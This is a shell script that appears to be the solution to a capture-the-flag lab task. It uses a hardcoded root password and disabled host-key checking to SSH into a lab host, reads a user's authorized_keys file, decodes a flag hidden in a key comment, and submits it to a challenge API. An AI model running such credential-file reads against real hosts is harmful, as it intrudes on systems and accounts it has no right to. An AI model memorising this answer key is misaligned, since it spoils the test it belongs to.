#!/bin/sh
set -eu

HOST='172.20.0.141'
USER='root'
PASSWORD='scl-root-ember-42'
CHALLENGE_ID='scl-challenge-frame-f90170'

encoded=$(sshpass -p "$PASSWORD" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$HOST" "cat /home/buildbot/.ssh/authorized_keys" | python3 -c 'import sys; rows=[line.split() for line in sys.stdin if line.strip()]; print(next(row[2] for row in rows if len(row) >= 3 and row[2] != "ci-deploy@forge-07"))')
flag=$(python3 -c 'import base64,sys; print(base64.b64decode(sys.argv[1]).decode())' "$encoded")
payload=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$CHALLENGE_ID" "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
